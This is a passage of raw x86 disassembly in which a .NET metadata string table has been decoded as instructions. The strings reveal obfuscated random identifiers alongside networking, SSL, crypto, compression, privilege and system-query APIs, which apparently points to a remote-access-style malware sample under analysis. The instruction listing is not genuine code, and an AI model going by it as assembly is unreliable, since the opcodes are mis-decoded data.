  408f68:	72 65                	jb     0x408fcf
  408f6a:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f6d:	74 69                	je     0x408fd8
  408f6f:	61                   	popa
  408f70:	6c                   	insb   (%dx),%es:(%edi)
  408f71:	00 53 79             	add    %dl,0x79(%ebx)
  408f74:	73 74                	jae    0x408fea
  408f76:	65 6d                	gs insl (%dx),%es:(%edi)
  408f78:	2e 53                	cs push %ebx
  408f7a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f7e:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f85:	6e 
  408f86:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f89:	61                   	popa
  408f8a:	6c                   	insb   (%dx),%es:(%edi)
  408f8b:	00 57 69             	add    %dl,0x69(%edi)
  408f8e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f8f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f91:	77 73                	ja     0x409006
  408f93:	50                   	push   %eax
  408f94:	72 69                	jb     0x408fff
  408f96:	6e                   	outsb  %ds:(%esi),(%dx)
  408f97:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f9a:	61                   	popa
  408f9b:	6c                   	insb   (%dx),%es:(%edi)
  408f9c:	00 67 65             	add    %ah,0x65(%edi)
  408f9f:	74 5f                	je     0x409000
  408fa1:	49                   	dec    %ecx
  408fa2:	6e                   	outsb  %ds:(%esi),(%dx)
  408fa3:	74 65                	je     0x40900a
  408fa5:	72 76                	jb     0x40901d
  408fa7:	61                   	popa
  408fa8:	6c                   	insb   (%dx),%es:(%edi)
  408fa9:	00 73 65             	add    %dh,0x65(%ebx)
  408fac:	74 5f                	je     0x40900d
  408fae:	49                   	dec    %ecx
  408faf:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb0:	74 65                	je     0x409017
  408fb2:	72 76                	jb     0x40902a
  408fb4:	61                   	popa
  408fb5:	6c                   	insb   (%dx),%es:(%edi)
  408fb6:	00 5a 6e             	add    %bl,0x6e(%edx)
  408fb9:	64 77 5a             	fs ja  0x409016
  408fbc:	56                   	push   %esi
  408fbd:	4b                   	dec    %ebx
  408fbe:	71 45                	jno    0x409005
  408fc0:	4f                   	dec    %edi
  408fc1:	71 69                	jno    0x40902c
  408fc3:	6c                   	insb   (%dx),%es:(%edi)
  408fc4:	00 6b 65             	add    %ch,0x65(%ebx)
  408fc7:	72 6e                	jb     0x409037
  408fc9:	65 6c                	gs insb (%dx),%es:(%edi)
  408fcb:	33 32                	xor    (%edx),%esi
  408fcd:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fd0:	6c                   	insb   (%dx),%es:(%edi)
  408fd1:	00 75 73             	add    %dh,0x73(%ebp)
  408fd4:	65 72 33             	gs jb  0x40900a
  408fd7:	32 2e                	xor    (%esi),%ch
  408fd9:	64 6c                	fs insb (%dx),%es:(%edi)
  408fdb:	6c                   	insb   (%dx),%es:(%edi)
  408fdc:	00 6e 74             	add    %ch,0x74(%esi)
  408fdf:	64 6c                	fs insb (%dx),%es:(%edi)
  408fe1:	6c                   	insb   (%dx),%es:(%edi)
  408fe2:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fe5:	6c                   	insb   (%dx),%es:(%edi)
  408fe6:	00 4b 69             	add    %cl,0x69(%ebx)
  408fe9:	6c                   	insb   (%dx),%es:(%edi)
  408fea:	6c                   	insb   (%dx),%es:(%edi)
  408feb:	00 50 6f             	add    %dl,0x6f(%eax)
  408fee:	6c                   	insb   (%dx),%es:(%edi)
  408fef:	6c                   	insb   (%dx),%es:(%edi)
  408ff0:	00 4e 6e             	add    %cl,0x6e(%esi)
  408ff3:	78 62                	js     0x409057
  408ff5:	42                   	inc    %edx
  408ff6:	49                   	dec    %ecx
  408ff7:	4d                   	dec    %ebp
  408ff8:	47                   	inc    %edi
  408ff9:	76 6c                	jbe    0x409067
  408ffb:	00 6c 7a 49          	add    %ch,0x49(%edx,%edi,2)
  408fff:	51                   	push   %ecx
  409000:	78 57                	js     0x409059
  409002:	41                   	inc    %ecx
  409003:	64 44                	fs inc %esp
  409005:	74 73                	je     0x40907a
  409007:	41                   	inc    %ecx
  409008:	4d                   	dec    %ebp
  409009:	50                   	push   %eax
  40900a:	6d                   	insl   (%dx),%es:(%edi)
  40900b:	00 4f 61             	add    %cl,0x61(%edi)
  40900e:	4f                   	dec    %edi
  40900f:	73 41                	jae    0x409052
  409011:	52                   	push   %edx
  409012:	52                   	push   %edx
  409013:	68 65 50 6d 00       	push   $0x6d5065
  409018:	69 4e 4f 55 46 46 41 	imul   $0x41464655,0x4f(%esi),%ecx
  40901f:	79 74                	jns    0x409095
  409021:	53                   	push   %ebx
  409022:	6d                   	insl   (%dx),%es:(%edi)
  409023:	00 68 45             	add    %ch,0x45(%eax)
  409026:	72 46                	jb     0x40906e
  409028:	66 51                	push   %cx
  40902a:	6d                   	insl   (%dx),%es:(%edi)
  40902b:	43                   	inc    %ebx
  40902c:	56                   	push   %esi
  40902d:	6d                   	insl   (%dx),%es:(%edi)
  40902e:	00 46 69             	add    %al,0x69(%esi)
  409031:	6c                   	insb   (%dx),%es:(%edi)
  409032:	65 53                	gs push %ebx
  409034:	74 72                	je     0x4090a8
  409036:	65 61                	gs popa
  409038:	6d                   	insl   (%dx),%es:(%edi)
  409039:	00 4e 65             	add    %cl,0x65(%esi)
  40903c:	74 77                	je     0x4090b5
  40903e:	6f                   	outsl  %ds:(%esi),(%dx)
  40903f:	72 6b                	jb     0x4090ac
  409041:	53                   	push   %ebx
  409042:	74 72                	je     0x4090b6
  409044:	65 61                	gs popa
  409046:	6d                   	insl   (%dx),%es:(%edi)
  409047:	00 53 73             	add    %dl,0x73(%ebx)
  40904a:	6c                   	insb   (%dx),%es:(%edi)
  40904b:	53                   	push   %ebx
  40904c:	74 72                	je     0x4090c0
  40904e:	65 61                	gs popa
  409050:	6d                   	insl   (%dx),%es:(%edi)
  409051:	00 43 72             	add    %al,0x72(%ebx)
  409054:	79 70                	jns    0x4090c6
  409056:	74 6f                	je     0x4090c7
  409058:	53                   	push   %ebx
  409059:	74 72                	je     0x4090cd
  40905b:	65 61                	gs popa
  40905d:	6d                   	insl   (%dx),%es:(%edi)
  40905e:	00 47 5a             	add    %al,0x5a(%edi)
  409061:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409068:	6d                   	insl   (%dx),%es:(%edi)
  409069:	00 4d 65             	add    %cl,0x65(%ebp)
  40906c:	6d                   	insl   (%dx),%es:(%edi)
  40906d:	6f                   	outsl  %ds:(%esi),(%dx)
  40906e:	72 79                	jb     0x4090e9
  409070:	53                   	push   %ebx
  409071:	74 72                	je     0x4090e5
  409073:	65 61                	gs popa
  409075:	6d                   	insl   (%dx),%es:(%edi)
  409076:	00 67 65             	add    %ah,0x65(%edi)
  409079:	74 5f                	je     0x4090da
  40907b:	49                   	dec    %ecx
  40907c:	74 65                	je     0x4090e3
  40907e:	6d                   	insl   (%dx),%es:(%edi)
  40907f:	00 67 65             	add    %ah,0x65(%edi)
  409082:	74 5f                	je     0x4090e3
  409084:	49                   	dec    %ecx
  409085:	73 36                	jae    0x4090bd
  409087:	34 42                	xor    $0x42,%al
  409089:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  409090:	74 
  409091:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409098:	65 6d                	gs insl (%dx),%es:(%edi)
  40909a:	00 53 79             	add    %dl,0x79(%ebx)
  40909d:	6d                   	insl   (%dx),%es:(%edi)
  40909e:	6d                   	insl   (%dx),%es:(%edi)
  40909f:	65 74 72             	gs je  0x409114
  4090a2:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090a9:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  4090b0:	79 
  4090b1:	6d                   	insl   (%dx),%es:(%edi)
  4090b2:	6d                   	insl   (%dx),%es:(%edi)
  4090b3:	65 74 72             	gs je  0x409128
  4090b6:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090bd:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4090c4:	73 
  4090c5:	68 41 6c 67 6f       	push   $0x6f676c41
  4090ca:	72 69                	jb     0x409135
  4090cc:	74 68                	je     0x409136
  4090ce:	6d                   	insl   (%dx),%es:(%edi)
  4090cf:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4090d3:	6d                   	insl   (%dx),%es:(%edi)
  4090d4:	00 6a 57             	add    %ch,0x57(%edx)
  4090d7:	54                   	push   %esp
  4090d8:	6c                   	insb   (%dx),%es:(%edi)
  4090d9:	4b                   	dec    %ebx
  4090da:	55                   	push   %ebp
  4090db:	4d                   	dec    %ebp
  4090dc:	58                   	pop    %eax
  4090dd:	43                   	inc    %ebx
  4090de:	6a 6d                	push   $0x6d
  4090e0:	00 52 61             	add    %dl,0x61(%edx)
  4090e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e4:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090e6:	6d                   	insl   (%dx),%es:(%edi)
  4090e7:	00 49 43             	add    %cl,0x43(%ecx)
  4090ea:	72 79                	jb     0x409165
  4090ec:	70 74                	jo     0x409162
  4090ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ef:	54                   	push   %esp
  4090f0:	72 61                	jb     0x409153
  4090f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f3:	73 66                	jae    0x40915b
  4090f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f6:	72 6d                	jb     0x409165
  4090f8:	00 45 6e             	add    %al,0x6e(%ebp)
  4090fb:	75 6d                	jne    0x40916a
  4090fd:	00 65 56             	add    %ah,0x56(%ebp)
  409100:	52                   	push   %edx
  409101:	52                   	push   %edx
  409102:	7a 69                	jp     0x40916d
  409104:	55                   	push   %ebp
  409105:	52                   	push   %edx
  409106:	76 6b                	jbe    0x409173
  409108:	6d                   	insl   (%dx),%es:(%edi)
  409109:	77 6d                	ja     0x409178
  40910b:	00 66 47             	add    %ah,0x47(%esi)
  40910e:	6c                   	insb   (%dx),%es:(%edi)
  40910f:	4a                   	dec    %edx
  409110:	48                   	dec    %eax
  409111:	4c                   	dec    %esp
  409112:	57                   	push   %edi
  409113:	6c                   	insb   (%dx),%es:(%edi)
  409114:	62 65 77             	bound  %esp,0x77(%ebp)
  409117:	52                   	push   %edx
  409118:	6e                   	outsb  %ds:(%esi),(%dx)
  409119:	00 4d 75             	add    %cl,0x75(%ebp)
  40911c:	78 54                	js     0x409172
  40911e:	6a 58                	push   $0x58
  409120:	41                   	inc    %ecx
  409121:	4a                   	dec    %edx
  409122:	4c                   	dec    %esp
  409123:	53                   	push   %ebx
  409124:	6e                   	outsb  %ds:(%esi),(%dx)
  409125:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409129:	6f                   	outsl  %ds:(%esi),(%dx)
  40912a:	6f                   	outsl  %ds:(%esi),(%dx)
  40912b:	6c                   	insb   (%dx),%es:(%edi)
  40912c:	65 61                	gs popa
  40912e:	6e                   	outsb  %ds:(%esi),(%dx)
  40912f:	00 7a 4e             	add    %bh,0x4e(%edx)
  409132:	49                   	dec    %ecx
  409133:	6f                   	outsl  %ds:(%esi),(%dx)
  409134:	63 4e 6e             	arpl   %ecx,0x6e(%esi)
  409137:	64 6d                	fs insl (%dx),%es:(%edi)
  409139:	68 6d 62 6e 00       	push   $0x6e626d
  40913e:	6c                   	insb   (%dx),%es:(%edi)
  40913f:	6d                   	insl   (%dx),%es:(%edi)
  409140:	62 55 6c             	bound  %edx,0x6c(%ebp)
  409143:	63 58 6d             	arpl   %ebx,0x6d(%eax)
  409146:	51                   	push   %ecx
  409147:	78 67                	js     0x4091b0
  409149:	6e                   	outsb  %ds:(%esi),(%dx)
  40914a:	00 4d 61             	add    %cl,0x61(%ebp)
  40914d:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  409154:	43                   	inc    %ebx
  409155:	68 61 69 6e 00       	push   $0x6e6961
  40915a:	41                   	inc    %ecx
  40915b:	70 70                	jo     0x4091cd
  40915d:	44                   	inc    %esp
  40915e:	6f                   	outsl  %ds:(%esi),(%dx)
  40915f:	6d                   	insl   (%dx),%es:(%edi)
  409160:	61                   	popa
  409161:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  409168:	43                   	inc    %ebx
  409169:	75 72                	jne    0x4091dd
  40916b:	72 65                	jb     0x4091d2
  40916d:	6e                   	outsb  %ds:(%esi),(%dx)
  40916e:	74 44                	je     0x4091b4
  409170:	6f                   	outsl  %ds:(%esi),(%dx)
  409171:	6d                   	insl   (%dx),%es:(%edi)
  409172:	61                   	popa
  409173:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40917a:	00 47 65             	add    %al,0x65(%edi)
  40917d:	74 46                	je     0x4091c5
  40917f:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  409186:	57 
  409187:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  40918e:	78 
  40918f:	74 65                	je     0x4091f6
  409191:	6e                   	outsb  %ds:(%esi),(%dx)
  409192:	73 69                	jae    0x4091fd
  409194:	6f                   	outsl  %ds:(%esi),(%dx)
  409195:	6e                   	outsb  %ds:(%esi),(%dx)
  409196:	00 67 65             	add    %ah,0x65(%edi)
  409199:	74 5f                	je     0x4091fa
  40919b:	4f                   	dec    %edi
  40919c:	53                   	push   %ebx
  40919d:	56                   	push   %esi
  40919e:	65 72 73             	gs jb  0x409214
  4091a1:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091a8:	74 65                	je     0x40920f
  4091aa:	6d                   	insl   (%dx),%es:(%edi)
  4091ab:	2e 49                	cs dec %ecx
  4091ad:	4f                   	dec    %edi
  4091ae:	2e 43                	cs inc %ebx
  4091b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b1:	6d                   	insl   (%dx),%es:(%edi)
  4091b2:	70 72                	jo     0x409226
  4091b4:	65 73 73             	gs jae 0x40922a
  4091b7:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4091be:	6c                   	insb   (%dx),%es:(%edi)
  4091bf:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4091c6:	00 53 79             	add    %dl,0x79(%ebx)
  4091c9:	73 74                	jae    0x40923f
  4091cb:	65 6d                	gs insl (%dx),%es:(%edi)
  4091cd:	2e 53                	cs push %ebx
  4091cf:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091d3:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4091da:	68 
  4091db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091dd:	74 69                	je     0x409248
  4091df:	63 61 74             	arpl   %esp,0x74(%ecx)
  4091e2:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091e9:	74 65                	je     0x409250
  4091eb:	6d                   	insl   (%dx),%es:(%edi)
  4091ec:	2e 52                	cs push %edx
  4091ee:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4091f1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f7:	00 58 35             	add    %bl,0x35(%eax)
  4091fa:	30 39                	xor    %bh,(%ecx)
  4091fc:	43                   	inc    %ebx
  4091fd:	65 72 74             	gs jb  0x409274
  409200:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409207:	43                   	inc    %ebx
  409208:	6f                   	outsl  %ds:(%esi),(%dx)
  409209:	6c                   	insb   (%dx),%es:(%edi)
  40920a:	6c                   	insb   (%dx),%es:(%edi)
  40920b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409210:	6e                   	outsb  %ds:(%esi),(%dx)
  409211:	00 4d 61             	add    %cl,0x61(%ebp)
  409214:	6e                   	outsb  %ds:(%esi),(%dx)
  409215:	61                   	popa
  409216:	67 65 6d             	gs insl (%dx),%es:(%di)
  409219:	65 6e                	outsb  %gs:(%esi),(%dx)
  40921b:	74 4f                	je     0x40926c
  40921d:	62 6a 65             	bound  %ebp,0x65(%edx)
  409220:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  409224:	6c                   	insb   (%dx),%es:(%edi)
  409225:	6c                   	insb   (%dx),%es:(%edi)
  409226:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40922b:	6e                   	outsb  %ds:(%esi),(%dx)
  40922c:	00 73 65             	add    %dh,0x65(%ebx)
  40922f:	74 5f                	je     0x409290
  409231:	50                   	push   %eax
  409232:	6f                   	outsl  %ds:(%esi),(%dx)
  409233:	73 69                	jae    0x40929e
  409235:	74 69                	je     0x4092a0
  409237:	6f                   	outsl  %ds:(%esi),(%dx)
  409238:	6e                   	outsb  %ds:(%esi),(%dx)
  409239:	00 43 72             	add    %al,0x72(%ebx)
  40923c:	79 70                	jns    0x4092ae
  40923e:	74 6f                	je     0x4092af
  409240:	67 72 61             	addr16 jb 0x4092a4
  409243:	70 68                	jo     0x4092ad
  409245:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  40924c:	74 69                	je     0x4092b7
  40924e:	6f                   	outsl  %ds:(%esi),(%dx)
  40924f:	6e                   	outsb  %ds:(%esi),(%dx)
  409250:	00 41 72             	add    %al,0x72(%ecx)
  409253:	67 75 6d             	addr16 jne 0x4092c3
  409256:	65 6e                	outsb  %gs:(%esi),(%dx)
  409258:	74 4e                	je     0x4092a8
  40925a:	75 6c                	jne    0x4092c8
  40925c:	6c                   	insb   (%dx),%es:(%edi)
  40925d:	45                   	inc    %ebp
  40925e:	78 63                	js     0x4092c3
  409260:	65 70 74             	gs jo  0x4092d7
  409263:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  40926a:	75 6d                	jne    0x4092d9
  40926c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40926e:	74 45                	je     0x4092b5
  409270:	78 63                	js     0x4092d5
  409272:	65 70 74             	gs jo  0x4092e9
  409275:	69 6f 6e 00 43 70 49 	imul   $0x49704300,0x6e(%edi),%ebp
  40927c:	5a                   	pop    %edx
  40927d:	78 66                	js     0x4092e5
  40927f:	6a 44                	push   $0x44
  409281:	4e                   	dec    %esi
  409282:	59                   	pop    %ecx
  409283:	58                   	pop    %eax
  409284:	59                   	pop    %ecx
  409285:	71 6e                	jno    0x4092f5
  409287:	00 54 74 47          	add    %dl,0x47(%esp,%esi,2)
  40928b:	67 50                	addr16 push %eax
  40928d:	6a 44                	push   $0x44
  40928f:	6f                   	outsl  %ds:(%esi),(%dx)
  409290:	45                   	inc    %ebp
  409291:	54                   	push   %esp
  409292:	4e                   	dec    %esi
  409293:	4f                   	dec    %edi
  409294:	6f                   	outsl  %ds:(%esi),(%dx)
  409295:	00 47 69             	add    %al,0x69(%edi)
  409298:	45                   	inc    %ebp
  409299:	42                   	inc    %edx
  40929a:	55                   	push   %ebp
  40929b:	68 66 79 68 62       	push   $0x62687966
  4092a0:	62 64 59 6f          	bound  %esp,0x6f(%ecx,%ebx,2)
  4092a4:	00 68 7a             	add    %ch,0x7a(%eax)
  4092a7:	46                   	inc    %esi
  4092a8:	71 6c                	jno    0x409316
  4092aa:	4e                   	dec    %esi
  4092ab:	54                   	push   %esp
  4092ac:	6b 46 77 74          	imul   $0x74,0x77(%esi),%eax
  4092b0:	71 64                	jno    0x409316
  4092b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092b3:	00 49 6d             	add    %cl,0x6d(%ecx)
  4092b6:	61                   	popa
  4092b7:	67 65 43             	addr16 gs inc %ebx
  4092ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4092bb:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4092c0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092c2:	00 46 69             	add    %al,0x69(%esi)
  4092c5:	6c                   	insb   (%dx),%es:(%edi)
  4092c6:	65 49                	gs dec %ecx
  4092c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092cb:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4092cf:	76 65                	jbe    0x409336
  4092d1:	49                   	dec    %ecx
  4092d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092d5:	00 46 69             	add    %al,0x69(%esi)
  4092d8:	6c                   	insb   (%dx),%es:(%edi)
  4092d9:	65 53                	gs push %ebx
  4092db:	79 73                	jns    0x409350
  4092dd:	74 65                	je     0x409344
  4092df:	6d                   	insl   (%dx),%es:(%edi)
  4092e0:	49                   	dec    %ecx
  4092e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092e4:	00 43 6f             	add    %al,0x6f(%ebx)
  4092e7:	6d                   	insl   (%dx),%es:(%edi)
  4092e8:	70 75                	jo     0x40935f
  4092ea:	74 65                	je     0x409351
  4092ec:	72 49                	jb     0x409337
  4092ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ef:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092f1:	00 43 53             	add    %al,0x53(%ebx)
  4092f4:	68 61 72 70 41       	push   $0x41707261
  4092f9:	72 67                	jb     0x409362
  4092fb:	75 6d                	jne    0x40936a
  4092fd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092ff:	74 49                	je     0x40934a
  409301:	6e                   	outsb  %ds:(%esi),(%dx)
  409302:	66 6f                	outsw  %ds:(%esi),(%dx)
  409304:	00 50 72             	add    %dl,0x72(%eax)
  409307:	6f                   	outsl  %ds:(%esi),(%dx)
  409308:	63 65 73             	arpl   %esp,0x73(%ebp)
  40930b:	73 53                	jae    0x409360
  40930d:	74 61                	je     0x409370
  40930f:	72 74                	jb     0x409385
  409311:	49                   	dec    %ecx
  409312:	6e                   	outsb  %ds:(%esi),(%dx)
  409313:	66 6f                	outsw  %ds:(%esi),(%dx)
  409315:	00 4d 69             	add    %cl,0x69(%ebp)
  409318:	7a 61                	jp     0x40937b
  40931a:	64 70 42             	fs jo  0x40935f
  40931d:	4a                   	dec    %edx
  40931e:	44                   	inc    %esp
  40931f:	6d                   	insl   (%dx),%es:(%edi)
  409320:	7a 69                	jp     0x40938b
  409322:	68 6f 00 6f 6d       	push   $0x6d6f006f
  409327:	72 67                	jb     0x409390
  409329:	52                   	push   %edx
  40932a:	67 56                	addr16 push %esi
  40932c:	64 4c                	fs dec %esp
  40932e:	41                   	inc    %ecx
  40932f:	6c                   	insb   (%dx),%es:(%edi)
  409330:	6f                   	outsl  %ds:(%esi),(%dx)
  409331:	00 46 48             	add    %al,0x48(%esi)
  409334:	73 77                	jae    0x4093ad
  409336:	63 6f 55             	arpl   %ebp,0x55(%edi)
  409339:	59                   	pop    %ecx
  40933a:	59                   	pop    %ecx
  40933b:	79 6f                	jns    0x4093ac
  40933d:	00 49 43             	add    %cl,0x43(%ecx)
  409340:	78 66                	js     0x4093a8
  409342:	79 6d                	jns    0x4093b1
  409344:	51                   	push   %ecx
  409345:	61                   	popa
  409346:	6e                   	outsb  %ds:(%esi),(%dx)
  409347:	41                   	inc    %ecx
  409348:	70 00                	jo     0x40934a
  40934a:	62 58 44             	bound  %ebx,0x44(%eax)
  40934d:	66 6c                	data16 insb (%dx),%es:(%edi)
  40934f:	48                   	dec    %eax
  409350:	62 54 49 4b          	bound  %edx,0x4b(%ecx,%ecx,2)
  409354:	4e                   	dec    %esi
  409355:	70 00                	jo     0x409357
  409357:	62 6b 63             	bound  %ebp,0x63(%ebx)
  40935a:	4b                   	dec    %ebx
  40935b:	5a                   	pop    %edx
  40935c:	47                   	inc    %edi
  40935d:	61                   	popa
  40935e:	6b 61 70 51          	imul   $0x51,0x70(%ecx),%esp
  409362:	70 00                	jo     0x409364
  409364:	53                   	push   %ebx
  409365:	6c                   	insb   (%dx),%es:(%edi)
  409366:	65 65 70 00          	gs gs jo 0x40936a
  40936a:	74 4f                	je     0x4093bb
  40936c:	6b 6d 44 67          	imul   $0x67,0x44(%ebp),%ebp
  409370:	53                   	push   %ebx
  409371:	70 4c                	jo     0x4093bf
  409373:	44                   	inc    %esp
  409374:	4d                   	dec    %ebp
  409375:	62 66 70             	bound  %esp,0x70(%esi)
  409378:	00 44 59 5a          	add    %al,0x5a(%ecx,%ebx,2)
  40937c:	42                   	inc    %edx
  40937d:	75 68                	jne    0x4093e7
  40937f:	70 6a                	jo     0x4093eb
  409381:	46                   	inc    %esi
  409382:	6e                   	outsb  %ds:(%esi),(%dx)
  409383:	70 00                	jo     0x409385
  409385:	55                   	push   %ebp
  409386:	4d                   	dec    %ebp
  409387:	6a 67                	push   $0x67
  409389:	43                   	inc    %ebx
  40938a:	6d                   	insl   (%dx),%es:(%edi)
  40938b:	70 79                	jo     0x409406
  40938d:	6e                   	outsb  %ds:(%esi),(%dx)
  40938e:	70 00                	jo     0x409390
  409390:	42                   	inc    %edx
  409391:	65 69 4c 42 59 6b 41 	imul   $0x7072416b,%gs:0x59(%edx,%eax,2),%ecx
  409398:	72 70 
  40939a:	00 4d 69             	add    %cl,0x69(%ebp)
  40939d:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4093a0:	73 6f                	jae    0x409411
  4093a2:	66 74 2e             	data16 je 0x4093d3
  4093a5:	43                   	inc    %ebx
  4093a6:	53                   	push   %ebx
  4093a7:	68 61 72 70 00       	push   $0x707261
  4093ac:	59                   	pop    %ecx
  4093ad:	41                   	inc    %ecx
  4093ae:	69 75 6a 79 4f 69 49 	imul   $0x49694f79,0x6a(%ebp),%esi
  4093b5:	44                   	inc    %esp
  4093b6:	47                   	inc    %edi
  4093b7:	79 66                	jns    0x40941f
  4093b9:	73 70                	jae    0x40942b
  4093bb:	00 71 4f             	add    %dh,0x4f(%ecx)
  4093be:	66 55                	push   %bp
  4093c0:	48                   	dec    %eax
  4093c1:	59                   	pop    %ecx
  4093c2:	6d                   	insl   (%dx),%es:(%edi)
  4093c3:	74 4a                	je     0x40940f
  4093c5:	62 4d 47             	bound  %ecx,0x47(%ebp)
  4093c8:	43                   	inc    %ebx
  4093c9:	71 00                	jno    0x4093cb
  4093cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4093cc:	4e                   	dec    %esi
  4093cd:	73 4e                	jae    0x40941d
  4093cf:	6c                   	insb   (%dx),%es:(%edi)
  4093d0:	41                   	inc    %ecx
  4093d1:	71 69                	jno    0x40943c
  4093d3:	67 6e                	outsb  %ds:(%si),(%dx)
  4093d5:	65 49                	gs dec %ecx
  4093d7:	71 00                	jno    0x4093d9
  4093d9:	46                   	inc    %esi
  4093da:	68 58 50 41 4a       	push   $0x4a415058
  4093df:	53                   	push   %ebx
  4093e0:	72 6a                	jb     0x40944c
  4093e2:	4e                   	dec    %esi
  4093e3:	71 00                	jno    0x4093e5
  4093e5:	72 70                	jb     0x409457
  4093e7:	49                   	dec    %ecx
  4093e8:	41                   	inc    %ecx
  4093e9:	6b 7a 70 6a          	imul   $0x6a,0x70(%edx),%edi
  4093ed:	47                   	inc    %edi
  4093ee:	4a                   	dec    %edx
  4093ef:	65 54                	gs push %esp
  4093f1:	49                   	dec    %ecx
  4093f2:	51                   	push   %ecx
  4093f3:	71 00                	jno    0x4093f5
  4093f5:	57                   	push   %edi
  4093f6:	61                   	popa
  4093f7:	52                   	push   %edx
  4093f8:	48                   	dec    %eax
  4093f9:	57                   	push   %edi
  4093fa:	76 63                	jbe    0x40945f
  4093fc:	78 53                	js     0x409451
  4093fe:	67 68 53 71 00 71    	addr16 push $0x71007153
  409404:	6e                   	outsb  %ds:(%esi),(%dx)
  409405:	75 51                	jne    0x409458
  409407:	6c                   	insb   (%dx),%es:(%edi)
  409408:	48                   	dec    %eax
  409409:	41                   	inc    %ecx
  40940a:	47                   	inc    %edi
  40940b:	42                   	inc    %edx
  40940c:	4e                   	dec    %esi
  40940d:	6c                   	insb   (%dx),%es:(%edi)
  40940e:	71 00                	jno    0x409410
  409410:	67 46                	addr16 inc %esi
  409412:	73 66                	jae    0x40947a
  409414:	4c                   	dec    %esp
  409415:	6a 63                	push   $0x63
  409417:	44                   	inc    %esp
  409418:	58                   	pop    %eax
  409419:	57                   	push   %edi
  40941a:	49                   	dec    %ecx
  40941b:	6e                   	outsb  %ds:(%esi),(%dx)
  40941c:	71 00                	jno    0x40941e
  40941e:	74 63                	je     0x409483
  409420:	58                   	pop    %eax
  409421:	41                   	inc    %ecx
  409422:	4d                   	dec    %ebp
  409423:	55                   	push   %ebp
  409424:	53                   	push   %ebx
  409425:	48                   	dec    %eax
  409426:	4e                   	dec    %esi
  409427:	6e                   	outsb  %ds:(%esi),(%dx)
  409428:	71 00                	jno    0x40942a
  40942a:	53                   	push   %ebx
  40942b:	79 73                	jns    0x4094a0
  40942d:	74 65                	je     0x409494
  40942f:	6d                   	insl   (%dx),%es:(%edi)
  409430:	2e 4c                	cs dec %esp
  409432:	69 6e 71 00 73 75 4e 	imul   $0x4e757300,0x71(%esi),%ebp
  409439:	44                   	inc    %esp
  40943a:	47                   	inc    %edi
